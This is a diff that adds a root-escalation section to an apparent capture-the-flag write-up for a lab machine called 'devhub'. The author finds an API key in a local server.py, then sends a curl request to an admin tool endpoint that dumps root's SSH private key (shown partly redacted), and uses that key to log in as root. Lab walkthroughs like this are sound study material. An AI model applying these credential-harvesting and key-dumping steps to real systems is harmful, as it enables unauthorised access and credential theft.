@@ -160,16 +160,81 @@ And browse: http://127.0.0.1:8888/
 
 <img src="images/jupiter_lab.png" width="800">   
 
-NOICE! A Terminal, let's abuse.
+NOICE! A Terminal.
 
 <img src="images/user_Key.png" width="800">   
 
 Got the user flag.  
-I also got ssh access following the same procedure used before.  
+I also got ssh access following the same procedure used before.   
 
+Now Escalation to root:  
 
+analyst@devhub:/opt$ ls -la opsmcp/server.py   
+-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 opsmcp/server.py  
 
+This file contains some passwords, api keys and modules that we can use.  
 
+```
+> cat /opt/opsmcp/server.py  
 
+[...]
 
+# API Key for authentication  
+VALID_API_KEY = "opsmcp_secret_key_<redacted>"  
+
+[...]  
+
+@app.route('/tools/call', methods=['POST'])  
+def call_tool():  
+    if not check_auth():  
+        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401  
+    
+    data = request.get_json() or {}  
+    tool_name = data.get('name', '')  
+    args = data.get('arguments', {})   
+      
+    if not tool_name:  
+        return jsonify({"error": "Tool name required"}), 400  
+    
+    if tool_name not in ALL_TOOLS:  
+        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404  
+ 
+ [...]   
+
+    elif tool_name == "ops._admin_dump":  
+        target = args.get('target', '')  
+        confirm = args.get('confirm', False)  
+        
+        if not confirm:  
+            return jsonify({   
+                "error": "Confirmation required",  
+                "usage": "Set confirm=true to proceed",  
+                "warning": "This dumps sensitive credentials"  
+            })
+```
+        
+So we can craft the request as following:
+
+```
+analyst@devhub:/opt$ curl -s -X POST http://127.0.0.1:5000/tools/call \
+  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
+  -H 'Content-Type: application/json' \
+  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
+```
+```
+{"note":"Emergency recovery key dump","root_private_key":"
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+Nh<REDACTED>ZodWI=
+-----END OPENSSH PRIVATE KEY-----","target":"ssh_keys"}
+```
+Now just use the private key to ssh as root:
+
+```
+> echo '-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjENh<REDACTED>ZodWI=-----END OPENSSH PRIVATE KEY-----' > root_key
+> chmod 600 root_key
+> ssh -i root_key root@devhub.htb
+root@devhub:~# cat /root/root.txt 
+4d5<redacted>
+```
 
